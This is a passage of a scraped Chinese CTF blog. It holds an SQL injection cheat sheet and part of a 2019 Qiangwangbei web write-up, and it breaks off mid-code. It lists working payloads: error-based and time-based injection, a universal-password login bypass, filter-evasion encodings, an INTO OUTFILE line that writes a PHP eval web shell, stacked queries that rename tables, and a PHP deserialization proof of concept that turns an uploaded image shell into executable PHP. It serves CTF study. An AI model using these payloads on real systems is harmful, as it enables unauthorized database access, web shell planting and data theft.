<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2)</span><br></pre></td></tr></table></figure>

<h2 id="Xpath报错"><a href="#Xpath报错" class="headerlink" title="Xpath报错"></a>Xpath报错</h2><p>放一个蓝鲸的题：<a href="http://202.98.3.108:10010/websql/index.php" target="_blank" rel="noopener">http://202.98.3.108:10010/websql/index.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//extractvalue </span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) %23 </span><br><span class="line">//updatexml </span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) %23</span><br></pre></td></tr></table></figure>

<h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(10))  %23</span><br></pre></td></tr></table></figure>

<h2 id="benchmark-实测未成功"><a href="#benchmark-实测未成功" class="headerlink" title="benchmark()(实测未成功)"></a>benchmark()(实测未成功)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (if(ascii(substr(current,1,1))=113,benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select database() as current) as tb1 %23</span><br></pre></td></tr></table></figure>

<h1 id="导入导出"><a href="#导入导出" class="headerlink" title="导入导出"></a>导入导出</h1><p>首先判断当前用户是否具有写入权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23  //返回正确，说明有最高权限</span><br></pre></td></tr></table></figure>

<p>将 select 内容导入文件，这里的 path 必须要是绝对路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version() into outfile &quot;path&quot; </span><br><span class="line">//version()也可以换成一句话 </span><br><span class="line">select &lt;?php @eval($_post[&quot;a&quot;])?&gt; into outfile &quot;path&quot;</span><br></pre></td></tr></table></figure>

<p>这里是可以直接 getshell 的</p>
<h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><p>和 GET 注入类似，只是传输的数据不在 URL 中显示，有时需要抓包。常见于登陆的页面</p>
<p>最常见的一个，万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users where username=&apos;$username&apos; and password=&apos;$password&apos; limit 0,1</span><br></pre></td></tr></table></figure>

<p>提交 username=admin’ #   password=1(任意密码) 即可登陆</p>
<p>有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里注入(报错注入，布尔盲注，时间盲注，联合查询)</p>
<h1 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h1><p>常见于注册(insert)和修改内容(update)的页面，有时需要抓包</p>
<p>比如修改密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;</span><br></pre></td></tr></table></figure>

<p>在 password 或者 username 处注入，最常见的用报错注入。有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里报错注入</p>
<p>这里也会造成二次注入</p>
<h1 id="HEADER头注入"><a href="#HEADER头注入" class="headerlink" title="HEADER头注入"></a>HEADER头注入</h1><p>抓包修改 header 头部，比如 user-agent，referer，cookie</p>
<p><strong>sqli-labs Less-18</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//Less-19的 referer 同理，也可以用 floor，updatexml </span><br><span class="line">1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png" alt="img"></p>
<p>我觉得Less-18是要输入正确的 uname 和 pass 的，否则是无法显示 user-agent</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png" alt="img"></p>
<p><strong>Less-20修改cookie</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin1&apos; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png" alt="img"></p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>这里是针对 ‘ 和 \ 被过滤的情况，一般采用 addslashes() 和 mysql_real_escape_string() 函数</p>
<p>两者都是对 ‘ 和 \ 进行了 replace 处理，’ 转化为 &#39; ，\ 转化为 \，但是对数字型注入无效</p>
<p>绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//GET型 </span><br><span class="line">?id=-1%df%27 union select 1 %23 </span><br><span class="line">//POST型，以万能密码为例，&apos; 转为 utf-16 或者 utf-32 </span><br><span class="line">//此处 �&apos; 的 urlencode 为 %ef%bf%bd%27  </span><br><span class="line">name=�&apos; or 1=1 # &amp;pass=111</span><br></pre></td></tr></table></figure>

<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中，用分号( ; )来表示语句的结尾，如果再 ; 结束一个 SQL 语句之后继续构造下一条语句，是会在一起执行的。对比于 union 的查询语句，堆叠注入可以执行任意语句</p>
<p><a href="https://peri0d.xyz/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/#%e9%9a%8f%e4%be%bf%e6%b3%a8" target="_blank" rel="noopener">强网杯-随便注</a></p>
<h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><h2 id="过滤-和-–"><a href="#过滤-和-–" class="headerlink" title="过滤 # 和 –+"></a>过滤 # 和 –+</h2><p>1、union 联合查询，控制查询结果显示位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,user(),&apos;3</span><br></pre></td></tr></table></figure>

<p>2、利用 or ‘1’=’1 闭合</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or extractvalue(1,concat(0x7e,(select user()),0x7e)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<p>3、编码绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//url encode </span><br><span class="line"># = %23 </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line"># = %23  </span><br><span class="line">--+ = %2D%2D%2B </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line"># = \u0023  </span><br><span class="line">--+ = \u002d\u002d\u002b </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">--+ = &amp;#45;&amp;#45;&amp;#43;  </span><br><span class="line"># = &amp;#35</span><br></pre></td></tr></table></figure>

<h2 id="过滤-and-和-or"><a href="#过滤-and-和-or" class="headerlink" title="过滤 and 和 or"></a>过滤 and 和 or</h2><p>1、编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//大小写 </span><br><span class="line">Or	OR	oR	AND </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">and = %61%6E%64  </span><br><span class="line">or = %6F%72 </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">and = \u0061\u006e\u0064  </span><br><span class="line">or = \u006f\u0072 </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">and = &amp;#97;&amp;#110;&amp;#100;       </span><br><span class="line">or = &amp;#111;&amp;#114;</span><br></pre></td></tr></table></figure>

<p>2、替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and = &amp;&amp; </span><br><span class="line">or = ||  </span><br><span class="line">//在 URL 栏中 &amp;&amp; 要换 %26%26</span><br></pre></td></tr></table></figure>

<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>1、特殊字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%a0	新建一行 </span><br><span class="line">%0b TAB垂直 </span><br><span class="line">/**/ 注释</span><br></pre></td></tr></table></figure>

<p>2、编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//unicode </span><br><span class="line">\u0020 </span><br><span class="line"></span><br><span class="line">//html encode</span><br><span class="line">&amp;#32;</span><br></pre></td></tr></table></figure>

<h2 id="过滤-union-和-select-等"><a href="#过滤-union-和-select-等" class="headerlink" title="过滤 union 和 select 等"></a>过滤 union 和 select 等</h2><p>1、编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//大小写 </span><br><span class="line">UniON  SelEcT </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">union = %75%6E%69%6F%6E  </span><br><span class="line">select = %73%65%6C%65%63%74 </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">union = \u0075\u006e\u0069\u006f\u006e  </span><br><span class="line">select = \u0073\u0065\u006c\u0065\u0063\u0074 </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">union = &amp;#32;&amp;#117;&amp;#110;&amp;#105;&amp;#111;&amp;#110;</span><br><span class="line">select = &amp;#115;&amp;#101;&amp;#108;&amp;#101;&amp;#99;&amp;#116;</span><br></pre></td></tr></table></figure>

<p>2、重复(只过滤一次时)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ununionion</span><br><span class="line">selselectect</span><br></pre></td></tr></table></figure>

<p>3、注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/ </span><br><span class="line">/*!select*/</span><br></pre></td></tr></table></figure>

<h2 id="过滤-‘-和"><a href="#过滤-‘-和" class="headerlink" title="过滤 ‘ 和 \"></a>过滤 ‘ 和 \</h2><p>1、宽字节注入</p>
<p>2、编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//url encode </span><br><span class="line">&apos; = %27 </span><br><span class="line">\ = %5c </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">&apos; = %27 </span><br><span class="line">\ = %5c </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">&apos; = \u0027 </span><br><span class="line">\ = \u005c </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">&apos; = &amp;#39;</span><br><span class="line">\ = &amp;#92;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/05/2019强网杯web复现/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/05/2019强网杯web复现/" itemprop="url">强网杯web复现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-05T12:17:46+08:00">
                2019-06-05
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-wp/" itemprop="url" rel="index">
                    <span itemprop="name">CTF wp</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>平台：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p>
<h1 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>大佬的 wp : <a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><ol>
<li><p>只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下</p>
</li>
<li><p>本题是 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 泄露，源码泄露总结<a href>点击此处</a></p>
</li>
<li><p>函数流程：</p>
<ol>
<li>没有登陆时，跳转到 index.php，进行注册登陆。login_check 函数将 cookie(‘user’) 赋给 profile，然后 base64 解码反序列化</li>
<li>在注册页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行注册</li>
<li>在登陆页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行登陆</li>
<li>已经登陆时，跳转到 index.php/home 进行文件上传操作</li>
<li>在进行上传操作时，对请求头中的 REMOTE_ADDR 进行 md5 加密并赋给 upload_menu ，然后创建以 upload_menu 命名的文件夹</li>
<li>然后进行登陆检查，然后将文件的临时副本的名称赋给 filename_tmp，将文件名(不加后缀)进行 md5 加密后赋给 filename</li>
<li>然后进行后缀检测，将 filename 的后缀赋给 ext，如果 ext 为 png 返回 1，否则返回 0</li>
<li>如果后缀是 png，检查图片内容，然后将 filename 赋给 filename_tmp，将图片相对路径赋给 img，执行 update_img 函数</li>
<li>update_img 函数先进行 user 查询，如果 user 没有上传过图片并且 img 存在，则更新 user 表的 img 字段，并执行 update_cookie 函数</li>
<li>update_cookie 函数将上传图片的 img 进行序列化和 base64 编码后赋给 cookie 的 user</li>
<li>profile 的 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。__get 会直接从 except 里找，__call 会调用自身的 name 成员变量所指代的变量所指代的方法。</li>
</ol>
</li>
<li><p>攻击流程：</p>
<ol>
<li><p>注册，登陆。登陆之后有个跳转的过程，这里就有了 cookie，如图</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_1.png" alt></p>
<p>解码后如图</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_2.png" alt></p>
</li>
<li><p>选择上传图片，这个图片就是合成的图片马，从 <a href="https://www.iconfont.cn/" target="_blank" rel="noopener">阿里巴巴矢量图库</a> 下载一个 png 图片，然后蚁剑生成一个 shell，用 hex 编辑器直接将 shell 内容放在图片后面即可。这里使用阿里的图库是因为网上的 png 图片可能 hex 格式不规范，导致后面改名之后会报 parse error</p>
</li>
<li><p>上传图片之后，会在 upload 目录下生成一个 md5(REMOTE_ADDR) 文件，而且文件名也会被 md5 加密，这时 cookie[‘user’] 如图</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_3.png" alt></p>
<p>解码后如图</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_4.png" alt></p>
</li>
<li><p>使用 poc 生成的序列化结果修改 cookie[‘user’]，刷新一次即可修改后缀。在服务器反序列化的过程中，在 Register 类中执行析构函数，调用 $profile 的 index() 函数，在 Profile 类的 __get 函数中定义了如果调用 index() 就去调用 img，而 __call 函数规定调用不可调用的函数时就调用 img 对应的函数，这样就控制函数跳转到 upload_img 函数，然后执行复制函数，将 png 改为 php，并删除原有的 png，至此，后缀修改完成。</p>
</li>
<li><p>最后直接用蚁剑连接 shell，读取配置文件中的数据库信息，选择 mysqli 驱动连接到数据库，即可读取 flag</p>
</li>
</ol>
</li>
<li><p>最终 poc 如下，修改上传图片地址即可</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">'index'</span> =&gt; <span class="string">'img'</span>];</span><br><span class="line">$profile-&gt;img = <span class="string">"upload_img"</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">"png"</span>;</span><br><span class="line"><span class="comment">//修改地址即可</span></span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/36a767e7b2d8d3bde3f881217a418ebb5.png"</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/6a767e7b2d8d3bde3f881217a418ebb5.php"</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="keyword">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>mysqli 是 PHP 驱动数据库的一种方式，以前是使用 mysql 的，而 mysqli 相比于 mysql 更加安全高效</p>
<p>copy(a, b)，a 和 b 是文件路径，将文件从 a 拷贝到 b，比如 copy(“./1.png”, “./1.php” ) 执行之后会存在两个文件 1.png 和 1.php</p>
<p>unlink(a)，a 是文件路径，删除文件 a</p>
</blockquote>
<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ol>
<li><p>打开靶机，随便提交，发现似乎是把 PHP 查询的原始结果之间返回了</p>
</li>
<li><p>输入 select 发现了过滤语句，过滤了 select，update，delete，drop，insert，where 和 . </p>
<p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
</li>
<li><p>测试一下有没有注入。<code>?inject=1&#39;%23</code>，返回正常，字符型注入</p>
</li>
<li><p>过滤了这么多关键词，尝试堆叠注入。<code>?inject=1&#39;;show databases;%23</code>，看到了所有的数据库</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png" alt></p>
</li>
<li><p>再看一下所有的表。<code>?inject=1&#39;;show tables;%23</code>，1919810931114514 表和 words 表</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png" alt></p>
</li>
<li><p>flag 在全数字的表里，默认查询的是 words 表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show columns from `1919810931114514`;%23</span><br><span class="line">?inject=1&apos;;show columns from `words`;%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/6.png" alt></p>
</li>
</ol>
<p>​        <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/7.png" alt></p>
<ol start="7">
<li><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了</p>
</li>
<li><p>构造 payload 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用  <code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code> 访问一下即可获得 flag</p>
</li>
</ol>
<h2 id="个人总结-1"><a href="#个人总结-1" class="headerlink" title="个人总结"></a>个人总结</h2><ol>
<li><p>MySQL中反引号和单引号的区别与用法</p>
<ol>
<li>MySql 中用一对反引号来标注 SQL 语句中的标识，如<strong>数据库名、表名、字段名</strong>等</li>
<li>引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即<strong>字段值</strong></li>
<li>例如：select * from `username` where `name`=”peri0d”</li>
</ol>
</li>
<li><p>PHP 代码推测，这里只是一个大概的流程，和实际可能有出入。参照 sqli-labs 里的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($inject)</span></span>&#123;</span><br><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'inject'</span>]))&#123;</span><br><span class="line">	$id = $_GET[<span class="string">'inject'</span>];</span><br><span class="line">	waf($id);</span><br><span class="line">	</span><br><span class="line">	$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line">	$sql = <span class="string">"select * from `words` where id = '$id';"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* execute multi query */</span></span><br><span class="line">	<span class="keyword">if</span> (mysqli_multi_query($con1, $sql))&#123;</span><br><span class="line">		<span class="comment">/* store first result set */</span></span><br><span class="line">		$result = mysqli_multi_query($con1);</span><br><span class="line">		<span class="keyword">if</span> ($result)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">			&#123;</span><br><span class="line">			  var_dump($row);</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* print divider */</span></span><br><span class="line">		<span class="keyword">if</span> (mysqli_more_results($con1))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	mysqli_close($con1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 